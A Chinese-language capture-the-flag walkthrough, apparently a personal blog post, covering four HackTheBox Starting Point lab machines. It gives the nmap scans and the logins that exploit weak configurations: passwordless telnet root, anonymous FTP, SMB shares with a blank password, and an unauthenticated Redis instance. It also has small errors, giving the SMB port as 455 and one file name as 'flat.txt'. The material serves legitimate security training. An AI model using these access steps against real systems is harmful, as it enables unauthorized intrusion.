---
title: HackTheBox初探
date: 2024-01-19 18:40:13
tags: 渗透测试
mathjax: true
---

# HackTheBox初探

## 开始使用

注册得科学上网，亲测还得用欧洲的，亚洲、中亚、美国的不行...

注册完就无所谓了。

注册后选择Starting Point，OpenVPN方式，下载vpn配置文件，然后连接：

```bash
openvpn xxx.ovpn
```

直到Starting Point变绿，ifconfig发现多出来一块虚拟网卡tun0。

## Meow

```bash
nmap -sV 10.129.42.107
```

23端口有telnet服务，尝试连接：

```bash
telnet 10.129.42.107
```

尝试一些用户名，例如admin、administrator、root等，发现root账户可免密登录。

拿flag。

## Fawn

```bash
nmap -sV 10.129.1.14
```

用了240秒...这速度不敢恭维。

21端口有ftp服务，尝试匿名anonymous登录发现成功，尝试下载：

```
ls
get flag.txt
bye
```

## Dancing

```bash
nmap -sV 10.129.4.186
```

455端口显示microsoft-ds?意味着存在Samba服务，尝试连接并列出可用共享标志/开关：

```bash
smbclient -U root -L 10.129.4.186
```

密码留空，成功登录，\$IPC忽略，其他三个进行访问：

```bash
smbclient -U root \\\\10.129.4.186\\ADMIN$
smbclient -U root \\\\10.129.4.186\\C$
smbclient -U root \\\\10.129.4.186\\WorkShares
```

前两个使用空密码都拒绝访问，最后一个成功。

进入smb shell，下载flag.txt：

```
ls
cd James.P
get flat.txt
exit
```

## Redeemer

全端口扫描：

```bash
nmap -p- --min-rate=1000 -sV 10.129.119.18
```

6379有redis服务，尝试连接：

```bash
redis-cli -h 10.129.119.18
```

使用info命令，看到最后Keyspace部分，含有数据库db0，尝试找flag：

```
select 0
keys *
get flag
exit
```
